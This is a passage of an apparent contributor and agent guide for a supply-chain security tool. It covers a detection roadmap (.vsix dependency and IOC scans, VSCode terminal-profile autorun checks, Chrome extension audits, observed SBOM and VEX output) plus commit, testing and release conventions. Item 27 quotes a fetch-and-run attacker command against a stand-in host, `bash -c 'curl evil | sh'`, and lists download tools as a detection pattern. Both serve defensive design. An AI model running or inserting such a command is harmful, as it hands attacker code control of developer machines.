    matrix lives in [crates/sakimori-core/tests/extension_report_matrix.rs](crates/sakimori-core/tests/extension_report_matrix.rs)
    covering the four meaningful corners (clean, pre-existing
    High, drift-time High, benign drift only).

    Pairs naturally with `file.deny` on the same paths once
    exposed via policy presets — the eBPF tripwire fires on the
    write itself while the post-run diff catches sideloads that
    bypass the Marketplace fetch.

25. **Bundled `node_modules` audit inside `.vsix`** *(priority:
    high)* — a `.vsix` is effectively `npm pack` over the
    extension's working tree, so the `extension/node_modules/`
    subtree ships pre-resolved transitive deps that the Marketplace
    integrity hash + MS signature attest to as a whole, but which
    the npm-side defences (release-age fallback, typosquat oracle,
    OSV scan, install inventory) never see — the deps don't touch
    `registry.npmjs.org` from the user's machine. Extend
    `sakimori_proxy::vsix_inspect::VsixInspection` with a
    `bundled_dependencies: Vec<BundledDep { name, version }>` field
    populated by walking every zip entry whose path matches
    `extension/node_modules/**/package.json` (skip scoped-pkg
    directories that don't carry a manifest, ignore nested
    `node_modules/.bin`). Bounded: per-manifest cap reuses
    `MAX_PACKAGE_JSON_BYTES`, total walk capped at
    `MAX_BUNDLED_DEP_ENTRIES = 4096` so a pathological tree can't
    stall the proxy. Fail-open per the existing inspector contract
    (corrupt entry → skip, don't fabricate a denial). Wire-up: in
    `proxy::handle_response`, after `lifecycle_inspect_vsix` parses
    a `.vsix`, emit one `InstallEvent { Ecosystem::Npm, name,
    version, ... }` per bundled dep with `execution_mode: unknown`
    (the dep was *fetched* via the editor's marketplace path, not
    via npm — calling it `persistent` would over-claim a lockfile
    relationship that doesn't exist; `ephemeral` is also wrong).
    Same `install_logger` + `otlp_exporter` + `hub_ingest_exporter`
    fan-out the top-level vsix event uses. From there:
    `sakimori advisories scan` already iterates the log and queries
    OSV — bundled `lodash@4.17.20` inside a `.vsix` now lights up
    the same way a top-level `lodash@4.17.20` install would. The
    `KnownBadOracle` + typosquat oracle are consulted at emit time
    so a bundled known-bad fails the `.vsix` outright under Block
    mode (new deny header: `x-sakimori-deny: lifecycle-vsix-
    bundled-known-bad`). Honest scope: this is **package-identity
    audit only** — we don't re-hash the bundled tarball against
    the public registry (Marketplace publishers legitimately patch
    deps before bundling; that's not a smell). The signal is
    "publisher bundled `<known-bad>@<bad-ver>`", not "the bundled
    bytes diverge from npm's bytes". A future slice could opt in
    to byte-identity verification per allow-listed package.

26. **In-`.vsix` IOC content-needle scan** *(priority: high)* —
    `sakimori-core::iocs::matches_content` already runs over
    workspace files and editor-extension directories; the bundled
    JS + JSON inside a freshly-fetched `.vsix` is exactly the same
    threat surface but currently untouched. Walk the zip on the
    same pass as #25 (single decode, two consumers), feed every
    text-shaped entry (`*.js`, `*.mjs`, `*.cjs`, `*.json`, `*.ts`,
    `*.sh`) through the existing catalog. Bounds: per-entry
    `MAX_CONTENT_BYTES` from the iocs module, per-vsix
    `MAX_SCANNED_ENTRIES = 2048` so a 50k-file extension can't
    burn the proxy thread. The `VsixInspection` grows an
    `ioc_hits: Vec<iocs::Finding>` field (path-prefixed with
    `vsix:<publisher>.<name>@<version>/`); the proxy block path
    treats any High-severity hit as a deny regardless of
    `fires_on_startup`, with header
    `x-sakimori-deny: lifecycle-vsix-ioc` and the matched rule id
    in the body. Audit mode logs at warn. Reuses the same catalog
    so a new needle landed for desktop installs (e.g. an emerging
    exfil host) lights up `.vsix` payloads on the next proxy
    restart with no separate update path. Pairs with #25: the
    bundled-dep audit catches *which package* is malicious;
    content-needle catches *what the JS does* when the package is
    novel and not yet in OSV. Fail-open on decode errors. Out of
    scope: deobfuscation, AST walking, regex pattern catalogs —
    `ContentNeedle` is deliberately substring-only and that's the
    right ceiling for the proxy hot path.

27. **`settings.json` terminal-profile autorun rule** *(priority:
    medium)* — the v2026.05.21 IOC catalog covers
    `tasks.json:"runOn":"folderOpen"` but not the parallel VSCode
    primitive: `terminal.integrated.profiles.<os>.<name>.args`
    can carry a shell that opens a workspace-bound terminal and
    immediately runs an attacker-supplied command (`bash -c
    'curl evil | sh'`). The existing `ContentNeedle` rule kind
    is too coarse (substring matches on `args` would false-positive
    constantly on legitimate `bash --login` profiles). Needs a new
    structural rule kind that parses `settings.json` (JSONC — strip
    `//` comments and trailing commas), walks
    `terminal.integrated.profiles.<os>` keys, and flags profiles
    whose `args` contains a shell flag (`-c`, `/c`, `-Command`)
    followed by a command longer than a configurable length, or
    that references `curl|wget|iwr|Invoke-WebRequest`. Severity
    Medium (legitimate but rare — devcontainers occasionally
    legitimately bootstrap this way). Scope: workspace
    `.vscode/settings.json` + `.cursor/settings.json`; user
    settings are out of scope (out-of-tree, attribution is hazier).
    Defer until #25/#26 land — the JSONC parser is a clean
    standalone surface but the bundled-deps gap is a wider hole.

28. **Chrome Web Store + `.crx` audit** *(priority: low)* —
    completes roadmap #20's Chrome half. Two pieces, both gated
    on out-of-band lookups because the update XML carries no
    inline publish-time:
    - **Chrome Web Store age oracle**: `ChromeWebStoreClient`
      mirrors the `NugetFlatContainerClient` / `PypiSimpleClient`
      pattern — fetch the detail page (or the unofficial JSON
      endpoint) for a given extension id, parse the "Updated:"
      timestamp, cache per-extension for 10 min. Feed the result
      into a new `chrome_web_store` rewriter that filters the
      update XML's `<updatecheck>` entries by age.
    - **`.crx` audit**: Chrome packages are signed end-to-end
      (CRX3 envelope = signed header + zip), so strip is
      impossible by design. Implement audit/block only: parse the
      CRX3 header to extract the extension id (sha256 of the
      first public key, first 16 bytes hex-encoded a-p), open the
      embedded zip, run the same manifest-v3 inspector
      (`background.service_worker`, `permissions`, `host_permissions`).
      Block-mode denial on
      `host_permissions: ["<all_urls>"]` + a `<all_urls>`
      content-script combination — the "extension can read every
      page" shape. Same fail-open semantics. Defer: Chrome
      extension installs on developer laptops are a smaller
      population than VSCode extensions, and the absence of an
      `npm pack`-style bundled-deps tree means there is no #25
      analogue to chain.

### SBOM surface (observed-not-declared — the moat)

Plain SBOM generation (lockfile → CycloneDX/SPDX) is **deliberately
not** a goal: Syft / Trivy / `npm sbom` / `cargo-cyclonedx` / GitHub's
dependency graph already commoditise it, and they are all
*lockfile-scoped* — i.e. the exact gap sakimori is positioned
against. Re-implementing that adds no differentiation. The SBOM
entries below instead all hang off sakimori's unique vantage point:
it observes what was **actually fetched and executed** at the fetch
layer, including the ephemeral runs (`npx` / `pnpm dlx` / `uvx` /
`pipx run` / `cargo install` / `go run <remote>`), git-direct
fetches, `.vsix` bundled deps, and editor-extension installs that
never land in any lockfile. Listed in implementation order; #29 is
the cheapest and the prerequisite for the rest.

29. **Observed (runtime) SBOM export** *(priority: medium)* —
    `sakimori sbom export` reads the install inventory
    (`~/.sakimori/installs.jsonl`, and/or a hub `GET /installs`
    pull) and emits a **CycloneDX 1.6 JSON** (default) / **SPDX 2.3**
    document. Unlike every commodity SBOM tool the component set is
    "what this machine/CI actually pulled", so it carries components
    no lockfile-derived SBOM can: ephemeral one-shot runs
    (`execution_mode: ephemeral` → CycloneDX `property
    sakimori:execution_mode`), git-source components with the
    `GitProvenance { url, resolved_commit, commit_source }` block
    mapped to CycloneDX `externalReferences` + `pedigree.commits`,
    `vscode-extension` components (publisher.name + version), and
    `.vsix` bundled `node_modules` (roadmap #25) as nested
    `components[].components`. `resolved_at` → `properties`. Scope
    knobs: `--since`, `--ecosystem`, `--execution-mode`,
    `--project-path`. Honest framing in the help text: this is an
    *observed* SBOM ("what ran"), **not** a declared dependency
    manifest — don't hand it to a procurement process expecting the
    lockfile tree. Foundation the next three entries read from.

30. **Declared-vs-observed SBOM diff** *(priority: high — strongest
    differentiator)* — `sakimori sbom diff <declared.sbom.json>`
    (or `--from-lockfile <path>` to derive the declared set via the
    existing `deps::lockfile` parsers) computes the set difference
    against the observed SBOM from #29 and reports three buckets:
    - **observed-but-not-declared** — components fetched/executed
      that no manifest references. This is the high-signal bucket:
      `npx`/`uvx` one-shots, a postinstall that `curl`ed a second
      package, a git-direct dep, a transitive pull that bypassed the
      lockfile. **No other tool can compute this** because no other
      tool observes the fetch layer — Dependabot/Snyk/Socket/Syft
      all start from the manifest and so are blind to exactly the
      components an attacker adds out-of-band.
    - **declared-but-not-observed** — manifest entries that never
      actually got fetched in the window (dead deps / optional deps
      not exercised). Lower security signal, useful for hygiene.
    - **version drift** — same `(eco, name)`, declared version ≠
      observed version (cache poisoning, mirror substitution, the
      TanStack-class content half from #13/#14).
    Exits non-zero on any observed-but-not-declared High-severity
    correlation (cross-referenced with the IOC catalog #18 +
    cloud-secret-egress #17 + persistence-write #16 observations
    for the same pid/attribution). Surfaces in the step summary +
    HTML report as an "SBOM drift" section. This is the SBOM feature
    that *is* a moat: it reframes "generate an SBOM" (commodity) as
    "prove the manifest matches reality" (only the fetch-layer agent
    can).

31. **VEX generation from execution mode + behavioural context**
    *(priority: high)* — `sakimori advisories scan` already JOINs
    the install inventory against OSV. Extend it with
    `--emit-vex <out.json>` to produce **CycloneDX VEX** (and/or
    OpenVEX) statements that assert *exploitability* using context
    only sakimori has:
    - a vulnerable component seen **only** as `execution_mode:
      ephemeral` that ran once on a date → VEX
      `analysis.state: in_triage` with a `detail` noting "executed
      <date>, not a persistent dependency — investigate compromise,
      not 'bump the lockfile'" (mirrors the CLAUDE.md ephemeral
      framing — the remediation is different, so the VEX must say
      so).
    - a vulnerable install-time hook (postinstall / `setup.py` /
      build-backend) whose lifecycle gate (#15) observed **no**
      script execution, or whose attribution shows the affected
      code path never opened a socket / touched the deny paths →
      `analysis.state: not_affected`,
      `justification: vulnerable_code_not_in_execute_path`, backed
      by the actual syscall observation rather than a human guess.
    - persistent, in-lockfile, hook fired → `affected` +
      `response: update`.
    No static SCA tool can populate `not_affected` with
    syscall-level evidence — they emit the raw advisory list and
    leave triage to humans. sakimori turning its run-time
    observations into machine-readable VEX is a genuinely novel
    artefact and directly attacks SCA alert-fatigue.

32. **Attested SBOM tied to the supervised run** *(priority:
    medium)* — when `sakimori run` / `daemon` produced the SBOM
    from observation (not post-hoc from a manifest), wrap it as an
    **in-toto / SLSA provenance attestation** (`predicateType:
    https://cyclonedx.org/bom` or the SLSA provenance predicate)
    referencing the run's JSON-log digest, then optionally sign it
    (sigstore/cosige keyless, or the ed25519 key the hub already
    uses). The pitch other SBOM tooling can't make: "this SBOM was
    generated by an agent that watched the build at the syscall
    layer, and here's the signed evidence linking the component list
    to the observed fetches" — provenance for the SBOM itself, not
    just for the artefacts. Pairs with the workspace-snapshot (#9) +
    IOC (#18) sections already in the run report so a single attested
    bundle answers "what was fetched, what ran, what it touched, and
    is the component list trustworthy". Out of scope for the first
    slice: full SLSA build-L3 hermeticity claims (we observe, we
    don't isolate the builder).

Explicitly **out of scope** (different product philosophy, not
a missing feature):

- Centralised SaaS dashboard / cross-runner correlation. coronarium
  is local-first; the JSON log + HTML report are the artefacts.
- Automatic runner hardening (sudo disabling, immutable rootfs).
  We don't take destructive actions on the runner without an
  explicit opt-in.
- Plain lockfile→SBOM generation (CycloneDX/SPDX from a manifest).
  Commoditised by Syft / Trivy / `npm sbom` / `cargo-cyclonedx` /
  GitHub dependency graph, and lockfile-scoped — the exact gap
  sakimori is positioned against. We only emit SBOM from *observed*
  fetch-layer data (roadmap #29–#32), never re-implement the
  static-manifest path.

## Crate layout

```
crates/
├── sakimori-common/   no_std + std types shared with eBPF (ring
│                        buffer records, map keys, POD structs).
├── sakimori-core/     Platform-neutral Rust: events, policy,
│                        matcher, stats, html, report, deps::*, watch.
├── sakimori-ebpf/     Linux kernel programs (tracepoint / cgroup
│                        hooks). Compiled to bpfel-unknown-none with
│                        nightly; excluded from the main workspace.
├── sakimori/          Linux userspace binary (eBPF loader +
│                        supervisor).
└── sakimori-win/      Windows binary (ETW subscriber, Defender
│                        Firewall driver). Its own workspace so
│                        ferrisetw doesn't pollute the Linux side.
```

`sakimori-core::deps` houses the per-ecosystem lockfile parsers
and registry clients. To add a new ecosystem:

1. `deps::lockfile::<name>` parser (input: path → `Vec<Package>`).
2. `deps::registry::<name>` client (input: `(name, version)` →
   `DateTime<Utc>`).
3. Add the variant to `deps::Ecosystem` + label.
4. Extend `deps::lockfile::detect` for the basename.
5. Fixture under `tests/fixtures/` and CI assertion in
   `.github/workflows/ci.yml`.
6. Bump the "supported" table in README.

## Pre-commit gate (non-negotiable)

Every commit pushed to a branch — by a human or an agent — must pass
all three of the following, with no warnings or failures:

```bash
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace
```

This is the same set CI runs, just locally. Fix the cause; don't
push red and don't `#[allow(...)]` away a clippy lint without a
comment explaining why the lint is wrong for that code. If a test
is genuinely flaky (e.g. nanos-based tmpdir collisions under
parallel runs) re-run once and, if it still fails, fix the flake
in a separate commit rather than ignoring it.

## DCO sign-off (every commit, no exceptions)

This repo runs a DCO check (`.github/workflows/dco.yml`) that fails
any push whose commits lack a `Signed-off-by:` trailer. **Always
pass `-s` / `--signoff` to `git commit`** — including amends,
cherry-picks, and rebases. Agents have repeatedly tripped on this
because the default Claude Code commit flow does not add `-s`.

```bash
git commit -s -m "fix(thing): ..."
# or, retroactively, on the current branch:
git rebase --signoff <merge-base> && git push --force-with-lease
```

Two practical rules so this stops costing a round-trip:

1. **First commit on a branch**: always `git commit -s`. If you
   forget, the DCO job in CI is your reminder — fix with
   `git rebase --signoff origin/main` then `--force-with-lease`.
2. **Do not add `Co-Authored-By: Claude ...` trailers.** This
   repo's auto-mode classifier blocks them as misrepresented
   authorship. The author identity is whatever `git config user.*`
   resolves to; the `Signed-off-by:` line is the only attribution
   trailer the project wants.

The detailed DCO text lives in [CONTRIBUTING.md](CONTRIBUTING.md);
this section is the operational shorthand so you don't forget.

## Testing conventions

- **Test-first whenever possible.** Handler traits are specifically
  designed to be mockable (see `action::Prompter`, `watch::Notifier`,
  `watch::EventSource`) so the interesting logic sits behind a
  deterministic fake and doesn't need real IO.
- Use `cargo test -p sakimori-core` for fast iteration; the full
  workspace runs eBPF + aya code that only builds meaningfully on
  Linux.
- Use real `git` in tests (not a mock) when that's cheaper than
  faking. `GitRevert` tests set up a real tmp repo — fast enough.
- Don't assert on exact error messages; search for substrings. CI
  runs across kernels and libc versions that differ in phrasing.

## Release process

Any push of a `v*` tag triggers `.github/workflows/release.yml`:
cross-compiles Linux (musl x86_64 + aarch64), macOS (both archs on
a single macos-14 runner), and Windows, then publishes a GitHub
Release with SHA-256 sidecars. The `v<MAJOR>` floating tag is
force-pushed to the newest release so consumers can pin `@v0`.

If you need to skip the floating tag update (e.g. for a prerelease
containing a hyphen like `v0.13.0-rc1`), the `moving-tag` job is
already gated on `!contains(github.ref_name, '-')`.

## Never do these

- Don't add `println!`/`eprintln!` on the hot event-ingest path
  — it serialises on the stdout mutex and tanks throughput.
- Don't put secrets in `log::` output. The JSON log is routinely
  uploaded as an artifact and surfaced in PR comments.
- Don't quietly change semantics (eg. make `watch` destructive by
  default). If the behaviour is potentially surprising, require
  an explicit `--action=…` opt-in and document the rationale.
- Don't auto-update the `v0` tag from a human workflow. Let
  `release.yml`'s `moving-tag` job own that.
